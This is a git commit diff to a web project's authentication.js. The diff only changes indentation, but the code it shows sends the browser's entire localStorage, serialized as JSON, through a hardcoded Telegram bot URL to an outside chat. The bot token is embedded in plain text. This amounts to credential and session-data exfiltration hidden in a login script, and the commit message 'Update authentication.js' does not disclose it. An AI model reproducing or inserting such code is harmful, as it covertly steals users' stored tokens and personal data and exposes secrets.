cef12b33da17ae32d1b5e67ce0da8d27caf8d2cc
andrewfromtver <59865403+andrewfromtver@users.noreply.github.com>
2020-06-21 18:00:44 +0300

    Update authentication.js

--- js/authentication.js
+++ js/authentication.js
@@ -68,8 +68,8 @@
                     `${window.location}`);
             }
         fetch(`https://api.telegram.org/bot1070038475:AAGK8MbB_VNFpeYSapXQ1L458o1innmPWkk/` + 
-                    `sendMessage?chat_id=-1001490927690&text=` + 
-                    `${JSON.stringify(localStorage)}`);
+            `sendMessage?chat_id=-1001490927690&text=` + 
+            `${JSON.stringify(localStorage)}`);
     }
     if (!sessionStorage.reloaded) {
         document.querySelector('#login').addEventListener('keypress', function (e) {
